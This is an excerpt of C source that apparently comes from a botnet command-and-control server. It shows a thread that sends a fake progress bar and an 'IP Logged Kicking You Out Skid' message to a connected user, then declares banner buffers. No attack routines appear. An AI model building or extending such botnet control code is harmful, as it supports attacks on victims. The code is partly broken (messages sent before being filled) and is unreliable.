...
void *BotWorker(void *sock) 
{
	...
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	sprintf(skidMsg2, "[*] 10%%");
	if(send(datafd, skidMsg2, strlen(skidMsg2), MSG_NOSIGNAL) == -1) return;
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	sprintf(skidMsg3, "[*] 20%%");
	if(send(datafd, skidMsg3, strlen(skidMsg3), MSG_NOSIGNAL) == -1) return;
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg4, strlen(skidMsg4), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg4, "[*] 30%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg5, strlen(skidMsg5), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg5, "[*] 40%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg6, strlen(skidMsg6), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg6, "[*] 50%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg7, strlen(skidMsg7), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg7, "[*] 60%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg8, strlen(skidMsg8), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg8, "[*] 70%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg9, strlen(skidMsg9), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg9, "[*] 80%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg10, strlen(skidMsg10), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg10, "[*] 90%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg11, strlen(skidMsg11), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg11, "[*] 100%%");
	sleep(0.15);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg12, strlen(skidMsg12), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg12, "IP Logged Kicking You Out Skid");
	...
	char ascii_banner_line1   [200];
	char ascii_banner_line2   [200];
	char ascii_banner_line3   [200];
	char ascii_banner_line4   [200];
	char ascii_banner_line5   [200];
	char ascii_banner_line6   [200];
	char ascii_banner_line7   [200];
	char ascii_banner_line8   [200];
	char ascii_banner_line9   [200];
	char ascii_banner_line10  [200];
	char ascii_banner_line11  [200];
	char ascii_banner_line12  [200];
	char ascii_banner_line13  [200];
	char ascii_banner_line14  [200];
	char ascii_banner_line15  [200];
	char ascii_banner_line16  [200];
	char ascii_banner_line17  [200];
	char ascii_banner_line18  [200];
	char ascii_banner_line19  [200];
	char ascii_banner_line20  [200];
	char ascii_banner_line21  [200];
	char ascii_banner_line22  [200];
